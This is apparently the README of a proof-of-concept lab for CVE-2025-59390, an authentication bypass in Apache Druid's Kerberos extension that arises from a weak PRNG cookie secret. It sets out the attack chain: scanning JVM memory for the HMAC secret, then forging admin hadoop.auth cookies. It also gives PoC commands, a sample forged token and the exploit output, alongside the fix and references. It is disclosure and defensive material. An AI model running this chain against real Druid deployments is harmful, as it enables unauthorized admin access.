# CVE-2025-59390 - Apache Druid Kerberos Authentication Bypass via Weak PRNG Cookie Signing

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-59390 |
| Component | [Apache Druid](https://github.com/apache/druid) |
| Type | CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator |
| CVSS | 9.8 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| EPSS | 0.1% (22.5th percentile) |
| Affected | Apache Druid ≤ 34.0.0 (all versions through 34.0.0) |
| Fix | Druid 35.0.0 — `cookieSignatureSecret` made mandatory ([PR #18368](https://github.com/apache/druid/pull/18368)) |
| Author | Exploit Intelligence Platform |
| Date | 2025-11-26 |

## Vulnerability Details

Apache Druid versions through 34.0.0 use a **cryptographically weak pseudo-random number generator** (`ThreadLocalRandom`) to generate the HMAC-SHA256 cookie signing secret when the `druid-kerberos` extension is enabled and the `cookieSignatureSecret` configuration property is not explicitly set. This allows an attacker to recover the signing secret and forge `hadoop.auth` authentication cookies for arbitrary users, **completely bypassing Kerberos (SPNEGO) authentication** on all Druid HTTP endpoints.

**Preconditions:**
- The `druid-kerberos` extension must be loaded
- `druid.auth.authenticator.kerberos.cookieSignatureSecret` must **not** be explicitly configured (default/omitted)

The vulnerability resides in `KerberosAuthenticator.java` within the `druid-kerberos` extension. When the `cookieSignatureSecret` configuration property is not set, the Druid Kerberos authenticator falls back to generating the HMAC-SHA256 cookie signing secret at runtime using:

```java
signatureSecret = Long.toString(ThreadLocalRandom.current().nextLong());
```

`ThreadLocalRandom` is a **linear congruential generator (LCG)** — it is designed for performance, not cryptographic security. This creates two critical weaknesses:

1. **Predictable output**: The LCG algorithm produces deterministic sequences from a seed derived from `Thread.currentThread().getId()` mixed with `System.nanoTime()`. If an attacker can estimate the JVM startup time (e.g., from HTTP response headers, uptime endpoints, or container metadata), the seed space can be reduced from 2^64 to as few as ~10^3 candidates.

2. **Invertible state**: A single observed `nextLong()` output allows full recovery of the PRNG's internal state via the `unmix64()` inverse function, enabling prediction of all past and future outputs.

The secret is additionally stored as a plain decimal string (`Long.toString()`) in the Java heap, making it trivially extractable from process memory via `/proc/PID/mem` scanning.

Each Druid node independently generates its own secret, causing further operational issues: cookies valid on one node are rejected by others, and secrets change on restart.

### Attack Chain

```
1. Attacker authenticates via SPNEGO with low-privilege Kerberos credentials → obtains signed hadoop.auth cookie
2. Attacker extracts the HMAC-SHA256 signing secret from JVM process memory (/proc/PID/mem scanning)
   OR brute-forces the ThreadLocalRandom seed from timing side-channels
3. Attacker forges hadoop.auth cookies for arbitrary users (admin, service principals) with far-future expiry
4. Attacker sends forged cookies to Druid HTTP endpoints → complete Kerberos authentication bypass
```

### Fix

The fix was introduced in [PR #18368](https://github.com/apache/druid/pull/18368) ("Making optional configs mandatory") and shipped in Apache Druid 35.0.0.

**Commit:** [`142d319f0a20ce2be59707db0abf3c52dfa35d0f`](https://github.com/apache/druid/commit/142d319f0a20ce2be59707db0abf3c52dfa35d0f)

1. **Removed `ThreadLocalRandom` import** — eliminates the weak PRNG fallback entirely.
2. **Mandatory constructor validation** — throws `DruidException` if `cookieSignatureSecret` is null or empty, preventing Druid from starting with a missing secret.
3. **Mandatory filter init validation** — defense-in-depth check that throws `DruidException` if the secret is somehow missing during filter initialization.
4. **Unconditional secret passing** — always sets `signature.secret` in filter parameters (removes the conditional `if (cookieSignatureSecret != null)` check).

**Fix assessment:** The fix is **complete and correct**. It addresses the root cause at two levels (constructor + filter init), providing defense in depth. No bypass vectors were identified.

> **Note:** The fix does not enforce minimum length or entropy requirements on the operator-provided secret. An operator could theoretically set `cookieSignatureSecret=a`, but this is a misconfiguration issue outside the scope of CVE-2025-59390.

## Lab Setup

### Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│  lab-net (internal bridge network)                              │
│                                                                 │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │
│  │ KDC          │  │ PostgreSQL   │  │ ZooKeeper            │  │
│  │ port 88      │  │ port 5432    │  │ port 2181            │  │
│  └──────────────┘  └──────────────┘  └──────────────────────┘  │
│                                                                 │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ Druid 34.0.0 Coordinator (VULNERABLE)                    │   │
│  │ port 8081                                                │   │
│  │ Kerberos auth: ENABLED                                   │   │
│  │ cookieSignatureSecret: NOT SET (triggers CVE-2025-59390) │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-59390

# Build and start
docker compose build
docker compose up -d

# Wait for containers to be healthy (~60s for Druid startup)
docker compose ps

# Run the exploit (uses localhost:8081 mapped port)
python3 poc/poc.py localhost 8081 cve-2025-59390-druid cve-2025-59390-kdc

# Cleanup
docker compose down -v
```

> **Note:** The `apache/druid:34.0.0` image is `linux/amd64` only. On ARM64 hosts (e.g., Apple Silicon), it runs via QEMU emulation — slower but fully functional.

### Container Details

| Container | Role | Base | Port | Description |
|---|---|---|---|---|
| `cve-2025-59390-kdc` | KDC | `debian:bookworm` | 88 | MIT Kerberos Key Distribution Center |
| `cve-2025-59390-postgres` | Metadata store | `postgres:16-bookworm` | 5432 | Druid metadata storage |
| `cve-2025-59390-zookeeper` | Coordination | `zookeeper:3.5.10` | 2181 | Druid coordination service |
| `cve-2025-59390-druid` | **Vulnerable** | `apache/druid:34.0.0` | `8081` | Druid coordinator with Kerberos auth (no `cookieSignatureSecret`) |

### Default Credentials

| Service | Username | Password |
|---|---|---|
| Kerberos test user | `testuser@EXAMPLE.COM` | `testpassword` |
| Kerberos admin | `admin/admin@EXAMPLE.COM` | `adminpassword` |
| PostgreSQL | `druid` | `FoolishPassword` |

## PoC Usage

Three PoC scripts demonstrate different attack vectors. All are located in the `poc/` directory and use **Python 3.6+ with stdlib only** (no external dependencies).

### PoC 1: End-to-End Authentication Bypass (`poc.py`)

The primary exploit chain: obtains a cookie via SPNEGO → extracts the HMAC secret from JVM memory → forges cookies for arbitrary users → verifies authentication bypass.

```bash
python3 poc/poc.py <druid_host> <druid_port> <druid_container> <kdc_container>
python3 poc/poc.py localhost 8081 cve-2025-59390-druid cve-2025-59390-kdc
```

### PoC 2: Cookie Forgery from Captured Cookie (`poc_vector2.py`)

Demonstrates that an attacker who captures a single `hadoop.auth` cookie can forge cookies for any user. No JVM memory access required — uses the known secret to verify and forge. Pass the token, signature, and secret from the `poc.py` output.

```bash
python3 poc/poc_vector2.py <host> <port> <token_string> <signature> <secret>
python3 poc/poc_vector2.py localhost 8081 \
  "u=testuser&p=testuser@EXAMPLE.COM&t=kerberos&e=1772423346642" \
  "t3lKCnjemeqxir5k7R2gGGj/ALOap5IlHTY02DYP5LY=" \
  "-6892152998210247728"
```

### PoC 3: ThreadLocalRandom Cryptographic Weakness (`poc_vector3.py`)

Standalone demonstration of why `ThreadLocalRandom` is unsuitable for cryptographic secrets. No running Druid instance required.

```bash
python3 poc/poc_vector3.py
```

### Expected Output (Vulnerable)

```
======================================================================
  CVE-2025-59390: Apache Druid Kerberos Authentication Bypass
  Weak PRNG (ThreadLocalRandom) Cookie Signing Secret
======================================================================

[*] Step 1: Obtaining valid hadoop.auth cookie via SPNEGO authentication
    [+] Got cookie: hadoop.auth="u=testuser&p=testuser@EXAMPLE.COM&t=kerberos&..."

[*] Step 2: Extracting HMAC secret from JVM process memory
    [+] Found 242 candidate long values in JVM heap
    [+] SECRET FOUND after testing 3 candidates!
    [+] Secret: -8471614901303401589

[*] Step 3: Forging authentication cookies for arbitrary users
    [+] Forged admin identity: hadoop.auth="u=admin&p=admin@EXAMPLE.COM&..."

[*] Step 4: Verifying authentication bypass with forged cookies
    GET /status (no cookie): HTTP 401
    [+] GET /status: HTTP 200 ✓
    [+] GET /druid/coordinator/v1/config: HTTP 200 ✓

======================================================================
[+] EXPLOIT SUCCESSFUL — Authentication bypass confirmed!
======================================================================
```

## Verification: Vulnerable vs Patched

| Aspect | Druid ≤ 34.0.0 (Vulnerable) | Druid 35.0.0+ (Patched) |
|---|---|---|
| **Missing `cookieSignatureSecret`** | Accepted silently; weak secret generated via `ThreadLocalRandom` | Startup fails with `DruidException` |
| **Log output** | `WARN: 'signature.secret' not set, using random value` | `ERROR: DruidException` — hard failure |
| **Cookie signing secret** | `Long.toString(ThreadLocalRandom.current().nextLong())` | Operator-supplied strong secret (mandatory) |
| **Secret predictability** | LCG-based; invertible from single output; constrained by timing | Operator-controlled |
| **Forged cookies** | Accepted — full auth bypass confirmed | Not possible without knowing the configured secret |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Full exploit: SPNEGO → memory scan → cookie forgery → auth bypass |
| `poc/poc_vector2.py` | Cookie forgery from captured cookie (no JVM access required) |
| `poc/poc_vector3.py` | ThreadLocalRandom cryptographic weakness demonstration |
| `Dockerfile.vulnerable` | Extends `apache/druid:34.0.0` with Kerberos configuration |
| `Dockerfile.kdc` | MIT Kerberos KDC container |
| `docker-compose.yml` | Orchestrates 4-container lab (KDC, PostgreSQL, ZooKeeper, Druid) |
| `environment` | Druid configuration (Kerberos auth enabled, no `cookieSignatureSecret`) |
| `krb5.conf` | Kerberos realm configuration |
| `kdc.conf` | KDC server configuration |
| `kadm5.acl` | Kerberos admin ACL |
| `kdc-entrypoint.sh` | KDC initialization and startup script |

## References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-59390)
- [Vendor Advisory](https://lists.apache.org/thread/jwjltllnntgj1sb9wzsjmvwm9f8rlhg8)
- [GitHub Advisory (GHSA-w88f-4875-99c8)](https://github.com/advisories/GHSA-w88f-4875-99c8)
- [Fix PR #18368](https://github.com/apache/druid/pull/18368)
- [Fix Commit](https://github.com/apache/druid/commit/142d319f0a20ce2be59707db0abf3c52dfa35d0f)
- [oss-security Disclosure](http://www.openwall.com/lists/oss-security/2025/11/26/1)

## Timeline

| Date | Event |
|---|---|
| **2025-08-06** | Fix committed ([PR #18368](https://github.com/apache/druid/pull/18368)) |
| **2025-11-26** | CVE-2025-59390 published; vendor advisory released |
| **2025-11-26** | Disclosed on oss-security mailing list |
| **Druid 35.0.0** | First patched release |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-59390 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
